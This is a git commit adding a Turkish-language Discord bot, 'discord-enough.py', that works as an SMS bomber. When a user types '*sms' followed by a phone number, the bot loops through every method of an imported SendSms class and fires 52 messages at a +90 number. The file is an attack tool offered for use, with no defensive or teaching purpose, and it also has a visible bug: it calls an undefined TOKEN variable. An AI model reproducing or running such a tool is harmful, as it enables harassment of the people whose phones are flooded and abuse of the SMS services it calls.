426723ee96db4845c6fc59034348733bd9bb2c0b
asiedisaskeriz <68537410+asiedisaskeriz@users.noreply.github.com>
2024-09-14 20:11:56 +0300

    Add files via upload

---
+++ discord-enough.py
@@ -0,0 +1,54 @@
+import os
+import sys
+import discord
+from time import sleep
+from sms import SendSms
+
+usertoken = os.getenv("TOKEN")
+if not usertoken:
+  print("[ERROR] Please add a token inside Secrets.")
+  sys.exit()
+
+gif = "https://media.tenor.com/SWiGXYOM8eMAAAAC/russia-soviet.gif"
+adet = 52
+saniye = 0
+
+intents = discord.Intents.all()
+client = discord.Client(intents=intents)
+
+@client.event
+async def on_ready():
+    print('{} Çalışmaya Başladı!'.format(client.user))
+    activity = discord.Activity(type=discord.ActivityType.playing, name="SMS Bomber Tools 💣 | TJJuanZ")
+    await client.change_presence(activity=activity)
+    
+@client.event
+async def on_message(message):
+    if message.author == client.user:
+        return
+
+    if len(message.content.split(" ")) == 2 and message.content.split(" ")[0] == "*sms":
+        if len(message.content.split(" ")[1]) == 10:
+            telno = message.content.split(" ")[1]
+            embed=discord.Embed(title="SMS Bomber (+90)", description=(f"{adet} adet SMS Gönderiliyor --> {telno}\n{message.author.mention}"), color=0x001eff)
+            embed.set_thumbnail(url=gif)
+            await message.channel.send(embed=embed)
+            sms = SendSms(telno, "")
+            while sms.adet < adet:
+                for attribute in dir(SendSms):
+                    attribute_value = getattr(SendSms, attribute)
+                    if callable(attribute_value):
+                        if attribute.startswith('__') == False:
+                            if sms.adet == adet:
+                                break
+                            exec("sms."+attribute+"()")
+                            sleep(saniye)
+            await message.channel.send(telno+" --> "+str(sms.adet)+f" adet SMS gönderildi.\n{message.author.mention}")                        
+        else:
+            await message.channel.send(f"Geçerli komut yazınız!\nYardım için ' *help ' yazınız.\n{message.author.mention}")
+    elif "*help" == message.content:
+        await message.channel.send(f"Sms göndermek için komutu aşağıdaki gibi yazınız.\n```*sms 5051234567```\n*sms (telefon numarası)\n{message.author.mention}")
+    else:
+        pass
+  
+client.run(TOKEN)
